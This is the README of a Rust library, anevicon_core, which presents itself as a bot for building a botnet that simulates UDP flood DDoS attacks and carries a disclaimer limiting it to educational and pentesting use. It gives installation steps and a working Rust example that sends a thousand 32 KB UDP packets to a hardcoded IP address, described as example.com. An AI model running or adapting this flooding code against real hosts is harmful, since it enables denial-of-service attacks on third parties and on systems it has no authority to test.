<div align="center">
  <h1>anevicon_core</h2>
  
  <a href="https://gitter.im/Gymmasssorla/anevicon">
    <img src="https://img.shields.io/badge/chat-on%20gitter-pink.svg">
  </a>
  <a href="https://travis-ci.com/Gymmasssorla/anevicon">
    <img src="https://travis-ci.com/Gymmasssorla/anevicon.svg?branch=master">
  </a>
  <a href="https://github.com/Gymmasssorla/anevicon/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/license-GPLv3-blue.svg">
  </a>
  <a href="https://crates.io/crates/anevicon_core">
    <img src="https://img.shields.io/badge/crates.io-v0.3.0-orange.svg">
  </a>
  <a href="https://docs.rs/anevicon_core">
    <img src="https://img.shields.io/badge/docs.rs-link-blue.svg">
  </a>
  <a href="https://semver.org">
    <img src="https://img.shields.io/badge/semver-follows-green.svg">
  </a>
  
  This crate can be used as a bot to build a [botnet](https://en.wikipedia.org/wiki/Botnet) for simulating [UDP-based DDoS attacks](https://en.wikipedia.org/wiki/UDP_flood_attack) (but only for educational and pentesting purposes, see [the GPLv3 license](https://github.com/Gymmasssorla/anevicon/blob/master/LICENSE), under which the library is distributed).
  
This library was designed to be as convenient and reliable as it is possible, and without any external dependencies (except of
the standard library). If you are just interested in one single program, please take a look at [this one](https://docs.rs/anevicon_core/0.1.0/anevicon_core/).
</div>

## Usage
First, you need to link the library with your executable (or another library) by putting `anevicon_core` to the `dependencies` section in your `Cargo.toml` like this:
```toml
[dependencies]
anevicon_core = "*"
```

Next, just copy this code into your `main` function and launch the compiled program, which simply sends one thousand empty packets to the `example.com` site:

[(`examples/minimal.rs`)](https://github.com/Gymmasssorla/anevicon/blob/master/anevicon_core/examples/minimal.rs)
```rust
use anevicon_core::summary::TestSummary;
use anevicon_core::testing::send;

// Setup the socket connected to the example.com domain
let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
socket.connect("93.184.216.34:80").unwrap();

let packet = vec![0; 32768];
let mut summary = TestSummary::default();

// Execute a test that will send one thousand packets
// each containing 32768 bytes.
for _ in 0..1000 {
    if let Err(error) = send(&socket, &packet, &mut summary) {
        panic!("{}", error);
    }
}

println!(
    "The total seconds passed: {}",
    summary.time_passed().as_secs()
);
```

This is how you are able to build your own stress-testing bot. Now you can follow [the official documentation](https://docs.rs/anevicon_core) to learn more about the `anevicon_core` abstractions.
